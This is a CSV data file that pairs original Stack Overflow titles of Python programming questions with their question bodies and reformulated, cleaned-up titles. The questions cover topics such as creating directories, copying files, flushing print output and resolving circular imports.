originalTitle,body,reformulatedTitle
Where can I find the time and memory efficencies of the built-in sequence types in Python," I've been unable to find a source for this information, short of looking through the Python source code myself to determine how the objects work. Does anyone know where I could find this online? <code> ",Where can I find the time and space complexity of the built-in sequence types in Python
How to get an absolute file name in Python?," Given a path such as ""mydir/myfile.txt"", how do I find the file's absolute path relative to the current working directory in Python? E.g. on Windows, I might end up with: <code>  ""C:/example/cwd/mydir/myfile.txt""",How to get an absolute file path in Python
How to get an absolute file path in Python?," Given a path such as ""mydir/myfile.txt"", how do I find the file's absolute path relative to the current working directory in Python? E.g. on Windows, I might end up with: <code>  ""C:/example/cwd/mydir/myfile.txt""",How to get an absolute file path in Python
Replacements for switch statement in python?," I want to write a function in Python that returns different fixed values based on the value of an input index. In other languages I would use a switch or case statement, but Python does not appear to have a switch statement. What are the recommended Python solutions in this scenario? <code> ",Replacements for switch/case statement in Python?
Replacements for switch statement in Python?," I want to write a function in Python that returns different fixed values based on the value of an input index. In other languages I would use a switch or case statement, but Python does not appear to have a switch statement. What are the recommended Python solutions in this scenario? <code> ",Replacements for switch/case statement in Python?
"Why do you need explicitly have the ""self"" argument into a Python method?"," When defining a method on a class in Python, it looks something like this: But in some other languages, such as C#, you have a reference to the object that the method is bound to with the ""this"" keyword without declaring it as an argument in the method prototype. Was this an intentional language design decision in Python or are there some implementation details that require the passing of ""self"" as an argument? <code>  class MyClass(object): def __init__(self, x, y): self.x = x self.y = y","Why do you need explicitly have the ""self"" argument in a Python method?"
Why isn't the 'Len' function inherited by dictionaries and lists in Python," example: Python being (very) object oriented, I don't understand why the 'len' function isn't inherited by the object. Plus I keep trying the wrong solution since it appears as the logical one to me <code>  a_list = [1, 2, 3]a_list.len() # doesn't worklen(a_list) # works",Why isn't the 'len' function inherited by dictionaries and lists in Python
Accessing object memory address," When you call the object.__repr__() method in Python you get something like this back: Is there any way to get a hold of the memory address if you overload __repr__(), other then calling super(Class, obj).__repr__() and regexing it out?  <code>  <__main__.Test object at 0x2aba1c0cf890> ",Accessing Object Memory Address
How do I copy a file in python?, How do I copy a file in Python?I couldn't find anything under osmodule. <code> ,How to copy files?
How do I copy a file in Python?, How do I copy a file in Python?I couldn't find anything under osmodule. <code> ,How to copy files?
How can a file be copied?, How do I copy a file in Python?I couldn't find anything under osmodule. <code> ,How to copy files?
How do I copy a file in Python?, How do I copy a file in Python?I couldn't find anything under osmodule. <code> ,How to copy files?
How to copy a files?, How do I copy a file in Python?I couldn't find anything under osmodule. <code> ,How to copy files?
Iterate a list as tuples in python," I could swear I've seen the function (or method) that takes a list, like this [3, 7, 19] and makes it into iterable list of tuples, like so: [(0,3), (1,7), (2,19)] to use it instead of: but I can't remember the name and googling ""iterate list"" gets nothing. <code>  for i in range(len(name_of_list)): name_of_list[i] = something",Iterate a list with indexes in Python
Iterate a list with indexes in python," I could swear I've seen the function (or method) that takes a list, like this [3, 7, 19] and makes it into iterable list of tuples, like so: [(0,3), (1,7), (2,19)] to use it instead of: but I can't remember the name and googling ""iterate list"" gets nothing. <code>  for i in range(len(name_of_list)): name_of_list[i] = something",Iterate a list with indexes in Python
Python: How to make a cross-module variable?," The __debug__ variable is handy in part because it affects every module. If I want to create another variable that works the same way, how would I do it?The variable (let's be original and call it 'foo') doesn't have to be truly global, in the sense that if I change foo in one module, it is updated in others. I'd be fine if I could set foo before importing other modules and then they would see the same value for it. <code> ",How to make a cross-module variable?
Crypto/x509 certificate parsing libraries for Python (pyOpenSSL vs Python OpenSSL Wrappers vs...)," Any recommended crypto libraries for Python. I know I've asked something similar in x509 certificate parsing libraries for Java, but I should've split the question in two.What I need is the ability to parse X.509 Certificates to extract the information contained in them.Looking around, I've found two options:Python OpenSSL Wrappers (http://sourceforge.net/projects/pow)pyOpenSSLOf the two, pyOpenSSL seems to be the most ""maintained"", but I'd like some feedback on anybody who might have experience with them? <code> ",Crypto/X509 certificate parsing libraries for Python
Hiding a password in a (python) script, I have got a python script which is creating an ODBC connection. The ODBC connection is generated with a connection string. In this connection string I have to include the username and password for this connection. Is there an easy way to obscure this password in the file (just that nobody can read the password when I'm editing the file) ?  <code> ,Hiding a password in a python script (insecure obfuscation only)
Python module dependency problem," Ok I have two modules, each containing a class, the problem is their classes reference each other.Lets say for example I had a room module and a person module containing CRoom and CPerson.The CRoom class contains infomation about the room, and a CPerson list of every one in the room.The CPerson class however sometimes needs to use the CRoom class for the room its in, for example to find the door, or too see who else is in the room.The problem is with the two modules importing each other I just get an import error on which ever is being imported second :(In c++ I could solve this by only including the headers, and since in both cases the classes just have pointers to the other class, a forward declaration would suffice for the header eg: Is there anyway to do this in python, other than placing both classes in the same module or something like that?edit: added python example showing problem using above classeserror: Traceback (most recent call last): File ""C:\Projects\python\test\main.py"", line 1, in from room import CRoom File ""C:\Projects\python\test\room.py"", line 1, in from person import CPerson File ""C:\Projects\python\test\person.py"", line 1, in from room import CRoom ImportError: cannot import name CRoom room.py person.py <code>  class CPerson;//forward declareclass CRoom{ std::set<CPerson*> People; ... from person import CPersonclass CRoom: def __init__(Self): Self.People = {} Self.NextId = 0 def AddPerson(Self, FirstName, SecondName, Gender): Id = Self.NextId Self.NextId += 1# Person = CPerson(FirstName,SecondName,Gender,Id) Self.People[Id] = Person return Person def FindDoorAndLeave(Self, PersonId): del Self.People[PeopleId] from room import CRoomclass CPerson: def __init__(Self, Room, FirstName, SecondName, Gender, Id): Self.Room = Room Self.FirstName = FirstName Self.SecondName = SecondName Self.Gender = Gender Self.Id = Id def Leave(Self): Self.Room.FindDoorAndLeave(Self.Id)",Python module dependency
"What is the difference between Ruby and Python versions of the ""self"" keyword?"," I've done some Python but have just now starting to use RubyI could use a good explanation of the difference between ""self"" in these two languages. Obvious on first glance:Self is not a keyword in Python, but there is a ""self-like"" value no matter what you call it.Python methods receive self as an explicit argument, whereas Ruby does not.Ruby sometimes has methods explicitly defined as part of self using dot notation.Initial Googling revealshttp://rubylearning.com/satishtalim/ruby_self.htmlhttp://www.ibiblio.org/g2swap/byteofpython/read/self.html  <code> ","What is the difference between Ruby and Python versions of""self""?"
Sleeping in a DOS batch file," When writing a batch file to automate something on a Windows box, I've needed to pause its execution for several seconds (usually in a test/wait loop, waiting for a process to start). At the time, the best solution I could find uses ping (I kid you not) to achieve the desired effect. I've found a better write-up of it here, which describes a callable ""wait.bat"", implemented as follows: You can then include calls to wait.bat in your own batch file, passing in the number of seconds to sleep.Apparently the Windows 2003 Resource Kit provides a Unix-like sleep command (at last!). In the meantime, for those of us still using Windows XP, Windows 2000 or (sadly) Windows NT, is there a better way?I modified the sleep.py script in the accepted answer, so that it defaults to one second if no arguments are passed on the command line: <code>  @ping 127.0.0.1 -n 2 -w 1000 > nul@ping 127.0.0.1 -n %1% -w 1000> nul import time, systime.sleep(float(sys.argv[1]) if len(sys.argv) > 1 else 1)",Sleeping in a batch file
Sleeping in a Batch file," When writing a batch file to automate something on a Windows box, I've needed to pause its execution for several seconds (usually in a test/wait loop, waiting for a process to start). At the time, the best solution I could find uses ping (I kid you not) to achieve the desired effect. I've found a better write-up of it here, which describes a callable ""wait.bat"", implemented as follows: You can then include calls to wait.bat in your own batch file, passing in the number of seconds to sleep.Apparently the Windows 2003 Resource Kit provides a Unix-like sleep command (at last!). In the meantime, for those of us still using Windows XP, Windows 2000 or (sadly) Windows NT, is there a better way?I modified the sleep.py script in the accepted answer, so that it defaults to one second if no arguments are passed on the command line: <code>  @ping 127.0.0.1 -n 2 -w 1000 > nul@ping 127.0.0.1 -n %1% -w 1000> nul import time, systime.sleep(float(sys.argv[1]) if len(sys.argv) > 1 else 1)",Sleeping in a batch file
Python 3 performance?," On a question of just performance, how does Python 3 compare to Python 2.x? <code> ",Performance: Python 3.x vs Python 2.x
Python 3.x vs Python 2.x," On a question of just performance, how does Python 3 compare to Python 2.x? <code> ",Performance: Python 3.x vs Python 2.x
Python list named indicies.," In PHP I can name my array indices so that I may have something like: Is this possible in Python? <code>  $shows = Array(0 => Array('id' => 1, 'name' => 'Sesame Street'), 1 => Array('id' => 2, 'name' => 'Dora The Explorer'));",Python: can I have a list with named indices?
What do i need to import to gain access to my models?, I'd like to run a script to populate my database. I'd like to access it through the Django database API.The only problem is that I don't know what I would need to import to gain access to this.How can this be achieved? <code> ,What do I need to import to gain access to my models?
List of ip addresses/hostnames from local network in python," How can I get a list of the IP addresses or host names from a local network easily in Python?It would be best if it was multi-platform, but it needs to work on Mac OS X first, then others follow.Edit: By local I mean all active addresses within a local network, such as 192.168.xxx.xxx.So, if the IP address of my computer (within the local network) is 192.168.1.1, and I have three other connected computers, I would want it to return the IP addresses 192.168.1.2, 192.168.1.3, 192.168.1.4, and possibly their hostnames. <code> ",List of IP addresses/hostnames from local network in Python
How to convert a C string (char *) into a Python string?," I have embedded a Python interpreter in a C program. Suppose the C program reads some bytes from a file into a char array and learns (somehow) that the bytes represent text with a certain encoding (e.g., ISO 8859-1, Windows-1252, or UTF-8). How do I decode the contents of this char array into a Python string?The Python string should in general be of type unicodefor instance, a 0x93 in Windows-1252 encoded input becomes a u'\u0201c'.I have attempted to use PyString_Decode, but it always fails when there are non-ASCII characters in the string. Here is an example that fails: The error message is UnicodeEncodeError: 'ascii' codec can't encode character u'\u201c' in position 0: ordinal not in range(128), which indicates that the ascii encoding is used even though we specify windows_1252 in the call to PyString_Decode.The following code works around the problem by using PyString_FromString to create a Python string of the undecoded bytes, then calling its decode method: <code>  #include <Python.h>#include <stdio.h>int main(int argc, char *argv[]){ char c_string[] = { (char)0x93, 0 }; PyObject *py_string; Py_Initialize(); py_string = PyString_Decode(c_string, 1, ""windows_1252"", ""replace""); if (!py_string) { PyErr_Print(); return 1; } return 0;} #include <Python.h>#include <stdio.h>int main(int argc, char *argv[]){ char c_string[] = { (char)0x93, 0 }; PyObject *raw, *decoded; Py_Initialize(); raw = PyString_FromString(c_string); printf(""Undecoded: ""); PyObject_Print(raw, stdout, 0); printf(""\n""); decoded = PyObject_CallMethod(raw, ""decode"", ""s"", ""windows_1252""); Py_DECREF(raw); printf(""Decoded: ""); PyObject_Print(decoded, stdout, 0); printf(""\n""); return 0;}",How to convert a C string (char array) into a Python string when there are non-ASCII characters in the string?
How to convert a C string (char array) into a Python string?," I have embedded a Python interpreter in a C program. Suppose the C program reads some bytes from a file into a char array and learns (somehow) that the bytes represent text with a certain encoding (e.g., ISO 8859-1, Windows-1252, or UTF-8). How do I decode the contents of this char array into a Python string?The Python string should in general be of type unicodefor instance, a 0x93 in Windows-1252 encoded input becomes a u'\u0201c'.I have attempted to use PyString_Decode, but it always fails when there are non-ASCII characters in the string. Here is an example that fails: The error message is UnicodeEncodeError: 'ascii' codec can't encode character u'\u201c' in position 0: ordinal not in range(128), which indicates that the ascii encoding is used even though we specify windows_1252 in the call to PyString_Decode.The following code works around the problem by using PyString_FromString to create a Python string of the undecoded bytes, then calling its decode method: <code>  #include <Python.h>#include <stdio.h>int main(int argc, char *argv[]){ char c_string[] = { (char)0x93, 0 }; PyObject *py_string; Py_Initialize(); py_string = PyString_Decode(c_string, 1, ""windows_1252"", ""replace""); if (!py_string) { PyErr_Print(); return 1; } return 0;} #include <Python.h>#include <stdio.h>int main(int argc, char *argv[]){ char c_string[] = { (char)0x93, 0 }; PyObject *raw, *decoded; Py_Initialize(); raw = PyString_FromString(c_string); printf(""Undecoded: ""); PyObject_Print(raw, stdout, 0); printf(""\n""); decoded = PyObject_CallMethod(raw, ""decode"", ""s"", ""windows_1252""); Py_DECREF(raw); printf(""Decoded: ""); PyObject_Print(decoded, stdout, 0); printf(""\n""); return 0;}",How to convert a C string (char array) into a Python string when there are non-ASCII characters in the string?
Javascript style field methods unpythonic?," I've started to use constructs like these: Update: based on this thread, I've revised the DictObj implementation to: where DictObj is a dictionary that can be accessed via dot notation: I find it more aesthetically pleasing than d['something']. Note that accessing an undefined key returns None instead of raising an exception, which is also nice.Update: Smashery makes a good point, which mhawke expands on for an easier solution. I'm wondering if there are any undesirable side effects of using dict instead of defining a new dictionary; if not, I like mhawke's solution a lot.AutoEnum is an auto-incrementing Enum, used like this: Both are working well for me, but I'm feeling unpythonic about them. Are these in fact bad constructs? <code>  class DictObj(object): def __init__(self): self.d = {} def __getattr__(self, m): return self.d.get(m, None) def __setattr__(self, m, v): super.__setattr__(self, m, v) class dotdict(dict): def __getattr__(self, attr): return self.get(attr, None) __setattr__= dict.__setitem__ __delattr__= dict.__delitem__class AutoEnum(object): def __init__(self): self.counter = 0 self.d = {} def __getattr__(self, c): if c not in self.d: self.d[c] = self.counter self.counter += 1 return self.d[c] d = DictObj()d.something = 'one' CMD = AutoEnum()cmds = { ""peek"": CMD.PEEK, ""look"": CMD.PEEK, ""help"": CMD.HELP, ""poke"": CMD.POKE, ""modify"": CMD.POKE,}",Javascript style dot notation for dictionary keys unpythonic? 
How to flush output of Python print?, How do I force Python's print function to output to the screen? <code> ,How can I flush the output of the print function (unbuffer python output)?
How to flush output of print function?, How do I force Python's print function to output to the screen? <code> ,How can I flush the output of the print function (unbuffer python output)?
How can I flush the output of the print function?, How do I force Python's print function to output to the screen? <code> ,How can I flush the output of the print function (unbuffer python output)?
Python for large scale developmen," I would be interested to learn about large scale development in Python and especially in how do you maintain a large code base?When you make incompatibility changes to the signature of a method, how do you find all the places where that method is being called. In C++/Java the compiler will find it for you, how do you do it in Python?When you make changes deep inside the code, how do you find out what operations an instance provides, since you don't have a static type to lookup?How do you handle/prevent typing errors (typos)?Are UnitTest's used as a substitute for static type checking?As you can guess I almost only worked with statically typed languages (C++/Java), but I would like to try my hands on Python for larger programs. But I had a very bad experience, a long time ago, with the clipper (dBase) language, which was also dynamically typed. <code> ",How can I use Python for large scale development?
Python for large scale development," I would be interested to learn about large scale development in Python and especially in how do you maintain a large code base?When you make incompatibility changes to the signature of a method, how do you find all the places where that method is being called. In C++/Java the compiler will find it for you, how do you do it in Python?When you make changes deep inside the code, how do you find out what operations an instance provides, since you don't have a static type to lookup?How do you handle/prevent typing errors (typos)?Are UnitTest's used as a substitute for static type checking?As you can guess I almost only worked with statically typed languages (C++/Java), but I would like to try my hands on Python for larger programs. But I had a very bad experience, a long time ago, with the clipper (dBase) language, which was also dynamically typed. <code> ",How can I use Python for large scale development?
How to get file creation & modification date/times in Python?," I have a script that needs to do some stuff based on file creation and modification dates, but it has to run on Linux and Windows.What's the best cross-platform way to get file creation and modification date/times in Python? <code> ",How to get file creation and modification date/times
How to get file creation & modification date/times?," I have a script that needs to do some stuff based on file creation and modification dates, but it has to run on Linux and Windows.What's the best cross-platform way to get file creation and modification date/times in Python? <code> ",How to get file creation and modification date/times
How do I parse a listing of files to get just the filenames in python?, So lets say I'm using Python's ftplib to retrieve a list of log files from an FTP server. How would I parse that list of files to get just the file names (the last column) inside a list? See the link above for example output. <code> ,How do I parse a listing of files to get just the filenames in Python?
Python filter/remove URL's from a list," I have a text file of URLs, about 14000. Below is a couple of examples:http://www.domainname.com/pagename?CONTENT_ITEM_ID=100&param2=123http://www.domainname.com/images?IMAGE_ID=10http://www.domainname.com/pagename?CONTENT_ITEM_ID=101&param2=123http://www.domainname.com/images?IMAGE_ID=11http://www.domainname.com/pagename?CONTENT_ITEM_ID=102&param2=123I have loaded the text file into a Python list and I am trying to get all the URLs with CONTENT_ITEM_ID separated off into a list of their own. What would be the best way to do this in Python?Cheers <code> ",Python filter/remove URLs from a list
Python: Best way to create directory if it doesn't exist for file write?," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
Create directory if it doesn't exist for file write," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
check if a directory exists and create it if necessary," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
Check if a directory exists and create it if necessary," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
"In Python, check if a directory exists and create it if necessary"," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
How to check if a directory exists and create it if necessary?," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
How can I create a directory if it does not exist?," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
How can I safely create a nested directory in Python?," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
How can I safely create a nested directory?," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
How can I safely create a nested directory in Python?," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
Can you acheive a case insensitive 'unique' constraint in Sqlite3 (with Django)?," So let's say I'm using Python 2.5's built-in default sqlite3 and I have a Django model class with the following code: I've got the admin interface setup and everything appears to be working fine except that I can create two SomeEntity records, one with some_field='some value' and one with some_field='Some Value' because the unique constraint on some_field appears to be case sensitive.Is there some way to force sqlite to perform a case insensitive comparison when checking for uniqueness?I can't seem to find an option for this in Django's docs and I'm wondering if there's something that I can do directly to sqlite to get it to behave the way I want. :-) <code>  class SomeEntity(models.Model): some_field = models.CharField(max_length=50, db_index=True, unique=True)",Can you achieve a case insensitive 'unique' constraint in Sqlite3 (with Django)?
python argument binders," How can I bind arguments to a Python method to store a nullary functor for later invocation? Similar to C++'s boost::bind.For example: <code>  def add(x, y): return x + yadd_5 = magic_function(add, 5)assert add_5(3) == 8",Python Argument Binders
